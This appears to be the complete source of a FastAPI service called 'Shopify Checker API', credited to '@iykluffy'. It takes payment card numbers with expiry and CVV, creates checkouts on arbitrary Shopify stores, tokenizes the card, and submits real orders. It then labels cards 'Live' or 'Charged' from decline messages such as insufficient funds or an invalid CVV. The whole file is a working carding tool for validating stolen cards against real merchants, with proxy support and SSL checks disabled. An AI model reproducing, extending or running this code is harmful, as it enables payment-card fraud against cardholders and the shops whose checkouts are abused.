from fastapi import FastAPI
import aiohttp
import asyncio
import json
import re
from urllib.parse import urlparse

app = FastAPI()

async def get_product(session, site):
    try:
        url = f"{site}/products.json?limit=1"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200:
                return None, None
            data = await r.json()
            products = data.get('products', [])
            if not products:
                return None, None
            product = products[0]
            variant = product['variants'][0]
            return str(variant['id']), str(variant['price'])
    except:
        return None, None

async def create_checkout(session, site, variant_id):
    try:
        url = f"{site}/cart/{variant_id}:1"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            final_url = str(r.url)
            if 'checkouts' in final_url:
                token = final_url.split('/checkouts/')[-1].split('?')[0]
                return token
        url2 = f"{site}/cart.js"
        payload = {"updates": {variant_id: 1}}
        async with session.post(url2, json=payload, timeout=aiohttp.ClientTimeout(total=15)) as r:
            pass
        url3 = f"{site}/checkout"
        async with session.get(url3, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True) as r:
            final_url = str(r.url)
            if 'checkouts' in final_url:
                token = final_url.split('/checkouts/')[-1].split('?')[0]
                return token
        return None
    except:
        return None

async def get_payment_gateway(session, site, token):
    try:
        url = f"{site}/checkouts/{token}"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            html = await r.text()
            if 'shopify_pay' in html.lower() or 'shopify-pay' in html.lower():
                return "Shopify"
            if 'stripe' in html.lower():
                return "Stripe-Shopify"
            return "Shopify"
    except:
        return "Shopify"

async def tokenize_card(session, cc, month, year, cvv):
    try:
        url = "https://elb.deposit.shopifycs.com/sessions"
        payload = {
            "credit_card": {
                "number": cc,
                "name": "John Doe",
                "month": int(month),
                "year": int(year),
                "verification_value": cvv
            }
        }
        headers = {"Content-Type": "application/json"}
        async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as r:
            if r.status != 200:
                return None
            data = await r.json()
            return data.get('id')
    except:
        return None

async def submit_payment(session, site, token, card_token, price):
    try:
        url = f"{site}/checkouts/{token}"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
            html = await r.text()
            authenticity = re.search(r'name="authenticity_token" value="([^"]+)"', html)
            auth_token = authenticity.group(1) if authenticity else ""
            gateway_match = re.search(r'"gateway":"([^"]+)"', html)
            gateway_id = gateway_match.group(1) if gateway_match else ""

        payload = {
            "_method": "patch",
            "authenticity_token": auth_token,
            "previous_step": "payment_method",
            "step": "",
            "s": card_token,
            "checkout[payment_gateway]": gateway_id,
            "checkout[credit_card][vault]": "false",
            "checkout[different_billing_address]": "false",
            "checkout[total_price]": price,
            "complete": "1",
            "checkout[client_details][browser_width]": "1280",
            "checkout[client_details][browser_height]": "720",
            "checkout[client_details][javascript_enabled]": "1",
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        }
        async with session.post(url, data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as r:
            response_text = await r.text()
            response_url = str(r.url)

            if 'thank_you' in response_url or 'thank-you' in response_url:
                return "Charged", "Order placed successfully"
            if 'processing' in response_url:
                return "Approved", "Payment processing"

            if 'card_number' in response_text or 'number' in response_text.lower() and 'invalid' in response_text.lower():
                return "Declined", "Invalid card number"
            if 'cvv' in response_text.lower() or 'security' in response_text.lower() and 'invalid' in response_text.lower():
                return "Approved", "Invalid CVV - Card Live"
            if 'insufficient' in response_text.lower():
                return "Approved", "Insufficient funds - Card Live"
            if 'declined' in response_text.lower():
                return "Declined", "Card declined"
            if 'zip' in response_text.lower() and 'incorrect' in response_text.lower():
                return "Approved", "Incorrect ZIP - Card Live"
            if 'expired' in response_text.lower():
                return "Declined", "Card expired"
            if '3d' in response_text.lower() or 'authenticate' in response_text.lower():
                return "Approved", "3D Secure required - Card Live"
            if 'payment' in response_url and 'gateway' in response_text.lower():
                return "Approved", "Payment gateway approved"

            return "Declined", "Generic decline"

    except Exception as e:
        return "Declined", str(e)

@app.get("/shopify")
async def check_shopify(site: str, cc: str, proxy: str = None):
    try:
        parts = cc.split("|")
        if len(parts) != 4:
            return {"Gateway": "UNKNOWN", "Price": 0.0, "Response": "Invalid CC format", "Status": False, "cc": cc}

        card_num, month, year, cvv = parts
        if len(year) == 2:
            year = "20" + year

        if not site.startswith("http"):
            site = "https://" + site
        site = site.rstrip("/")

        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            variant_id, price = await get_product(session, site)
            if not variant_id:
                return {"Gateway": "UNKNOWN", "Price": 0.0, "Response": "Failed to get product", "Status": False, "cc": cc}

            checkout_token = await create_checkout(session, site, variant_id)
            if not checkout_token:
                return {"Gateway": "UNKNOWN", "Price": 0.0, "Response": "Failed to create checkout", "Status": False, "cc": cc}

            gateway = await get_payment_gateway(session, site, checkout_token)

            card_token = await tokenize_card(session, card_num, month, year, cvv)
            if not card_token:
                return {"Gateway": gateway, "Price": float(price) if price else 0.0, "Response": "Failed to tokenize card", "Status": False, "cc": cc}

            status, response = await submit_payment(session, site, checkout_token, card_token, price)

            return {
                "Gateway": gateway,
                "Price": float(price) if price else 0.0,
                "Response": response,
                "Status": status in ["Charged", "Approved"],
                "cc": cc
            }

    except Exception as e:
        return {"Gateway": "UNKNOWN", "Price": 0.0, "Response": str(e), "Status": False, "cc": cc}

@app.get("/")
async def root():
    return {"status": "alive", "message": "Shopify Checker API", "dev": "@iykluffy"}
